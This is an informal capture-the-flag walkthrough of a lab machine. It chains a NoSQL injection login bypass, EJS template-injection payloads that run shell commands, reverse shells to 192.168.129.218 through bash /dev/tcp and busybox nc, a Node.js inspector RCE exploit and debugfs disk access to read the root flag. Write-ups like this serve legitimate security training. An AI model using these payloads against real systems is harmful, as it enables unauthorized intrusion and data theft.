a noSQL injection was found 
in burp suite:
username=attendant&password[$ne]=1
after i got the cookie from burp i edited the cookie in my browser
after some research about ejs "ejs file rendering for rce payloads  <%="
so i passed:
<%= global.process.mainModule.require("child_process").execSync("id").toString() %>
<%= global.process.mainModule.require("child_process").execSync("ls /home").toString() %>
<%= global.process.mainModule.require("child_process").execSync("cat /home/poolside/user.txt").toString() %>
and i got the flag
bash -i >& /dev/tcp/192.168.129.218/4444 0>&1
it didnt work so i visited revshell and tried every revshell until one worked:
> busybox nc 192.168.129.218 4444 -e sh
python3 -c 'import pty; pty.spawn("/bin/bash")'
i did ps aux and saw process.js which is running on port 9229
after some googling i found out it a Node.js inspector
and can get data from it only from /json
=> curl -s http://127.0.0.1:9229/json
then i ran node inspect 127.0.0.1:9229
so searched for node js inspector exploit
https://github.com/BHBarlow/node-inspector-rce/
after saving the exploit in a file i open a server on port 8000
then fetched it using wget from the server
next i ran this
python3 script.py --payload id
python3 script.py --payload revshell --lhost 192.168.129.218 --lport 1234
and i gained a reverse shell to pipelinesvc, after checking id 
i knew that i can manipulate the disk
so i ran lsblk -f 
└─nvme0n1p1 259:2    0    20G  0 part /
and located the block in which there is the root flag
debugfs /dev/nvme0n1p1
next, i ran ls to list to directory
next i printed out root/root.txt and i got the file
